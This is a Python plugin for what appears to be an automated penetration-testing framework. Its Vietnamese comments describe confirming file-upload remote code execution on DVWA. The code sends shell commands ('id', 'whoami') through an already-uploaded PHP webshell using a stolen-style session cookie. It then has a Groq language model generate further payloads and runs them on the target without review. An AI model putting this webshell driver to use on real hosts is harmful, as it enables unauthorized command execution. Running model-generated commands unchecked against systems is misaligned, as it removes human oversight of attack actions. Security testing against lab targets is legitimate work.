import urllib.request
import urllib.parse
import urllib.error
import socket
import re
import time
import os
from typing import Dict, Any
from plugins.base_plugin import BasePlugin
from ai_self_validation import groq_generate_payloads, groq_evaluate_results

class DVWAUploadPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-UPLOAD",
            "name": "DVWA File Upload RCE",
            "cvss_score": 9.0,
            "service": "http",
            "vuln_type": "file_upload"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service","") in ["http","https"]

    def _execute_shell(self, target_ip, target_port, filename, cmd, cookie):
        """Gọi webshell đã upload để thực thi lệnh (có Timeout Handling)"""
        try:
            encoded_cmd = urllib.parse.quote(cmd)
            url = f"http://{target_ip}:{target_port}/hackable/uploads/{filename}?cmd={encoded_cmd}"
            req = urllib.request.Request(url)
            req.add_header("Cookie", cookie)
            
            t0 = time.time()
            resp = urllib.request.urlopen(req, timeout=5)
            elapsed = round(time.time() - t0, 3)
            output = resp.read().decode('utf-8').strip()
            
            # Lọc bỏ rác HTML nếu webshell in lẫn lộn
            clean_lines = []
            garbage_keywords = ["<html", "<body", "<div", "<!DOCTYPE"]
            for line in output.split('\n'):
                if any(kw in line.lower() for kw in garbage_keywords):
                    continue
                if line.strip(): clean_lines.append(line.strip())
            
            output = '\n'.join(clean_lines)[:300] # Lấy 300 ký tự đầu của kết quả

            return {"output": output, "response_time": elapsed, "error": None}
            
        except urllib.error.URLError as e:
            if isinstance(e.reason, socket.timeout):
                return {"output": "[SYSTEM_TIMEOUT: Lệnh (như sleep) đã thực thi qua Webshell thành công!]", "response_time": 5.0, "error": None}
            return {"output": "", "response_time": -1, "error": str(e)}
        except socket.timeout:
            return {"output": "[SYSTEM_TIMEOUT: Lệnh (như sleep) đã thực thi qua Webshell thành công!]", "response_time": 5.0, "error": None}
        except Exception as e:
            return {"output": "", "response_time": -1, "error": str(e)}

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie","")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie"}

        # Giả định bước Upload Shell (shell.php) đã thành công ở bước trước hoặc thông qua config
        # Ở đây ta tập trung vào việc Verify RCE thông qua shell đã upload.
        uploaded_shell = "shell.php" 
        all_results = []

        initial_payloads = [
            ("id", "Verify System Execution"),
            ("whoami", "Check User Privilege")
        ]

        print(f"      [Upload] PHASE 1: Thử verify RCE qua webshell {uploaded_shell}...")
        initial_confirmed = None
        for cmd, technique in initial_payloads:
            print(f"      [Upload] [{technique}] Lệnh: {cmd}")
            result = self._execute_shell(target_ip, target_port, uploaded_shell, cmd, cookie)
            marker_hit = "uid=" in result["output"] or "www-data" in result["output"]
            status = "HIT" if marker_hit else "MISS"
            print(f"      [Upload] Response time: {result['response_time']}s | Status: {status}")
            
            all_results.append({
                "phase": "initial", "technique": technique, "payload": cmd,
                "output": result["output"][:200], "response_time": result["response_time"], "hit": marker_hit
            })
            if marker_hit and not initial_confirmed:
                initial_confirmed = {"payload": cmd, "output": result["output"], "technique": technique}

        if not initial_confirmed:
            return {"status": "FALSE_POSITIVE", "evidence": "Không thể thực thi lệnh qua file đã upload (Có thể chưa upload thành công hoặc file bị sanitize)."}

        print(f"\n      [Upload] PHASE 2: AI Groq suy luận và sinh payload bổ sung...")
        ai_plan = groq_generate_payloads("DVWA-UPLOAD", "webshell command execution", f"/uploads/{uploaded_shell}", initial_confirmed)

        print(f"\n      [Upload] PHASE 2a & 2b: Thực thi payload AI & Kiểm tra Honeypot...")
        test_payloads = ai_plan.get("confirm_payloads", []) + ai_plan.get("honeypot_payloads", [])
        for p in test_payloads:
            cmd, purpose = p.get("payload",""), p.get("purpose","")
            print(f"      [Upload] [AI Test] Lệnh: {cmd}")
            result = self._execute_shell(target_ip, target_port, uploaded_shell, cmd, cookie)
            hit = bool(result["output"]) and result["error"] is None
            if result["output"]: print(f"      [Upload] Output: {result['output'][:100]}...")
            
            all_results.append({
                "phase": "ai_test", "purpose": purpose, "payload": cmd,
                "output": result["output"][:200], "response_time": result["response_time"], "hit": hit
            })

        print(f"\n      [Upload] PHASE 3: AI đánh giá tổng hợp tất cả kết quả...")
        verdict = groq_evaluate_results("DVWA-UPLOAD", all_results, ai_plan.get("honeypot_suspicion","low"))
        
        final_status = verdict.get("verdict","PENDING")
        if final_status == "HONEYPOT_SUSPECTED": final_status = "PENDING"

        valuable_hits = [r for r in all_results if r["hit"] and ("uid=" in r["output"] or "www-data" in r["output"] or "SYSTEM_TIMEOUT" in r["output"])]
        best_hit = valuable_hits[0] if valuable_hits else initial_confirmed

        return {
            "status": final_status,
            "evidence": (
                f"File Upload RCE — AI Self-Validation hoàn tất.\n"
                f"      - Webshell File      : {uploaded_shell}\n"
                f"      - Payload tốt nhất   : {best_hit['payload']}\n"
                f"      - Output trích xuất  : {best_hit['output'][:150].strip()}\n"
                f"      - AI Reasoning       : {verdict.get('final_reasoning')}"
            )
        }
